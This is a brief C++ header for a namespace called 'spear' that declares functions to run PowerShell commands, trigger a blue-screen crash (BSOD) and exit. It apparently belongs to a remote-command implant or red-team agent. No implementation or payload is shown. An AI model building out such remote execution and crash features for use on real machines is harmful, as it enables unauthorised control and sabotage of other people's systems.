#pragma once
#ifndef _COMMAND_H_
#define _COMMAND_H_

#include <string>
#include <nlohmann/json.hpp>

namespace spear
{
    std::string RunPowerShell(const std::string& strCmd);
    std::string BSOD(const std::string& args);
    std::string Exit(const std::string& args);
}

#endif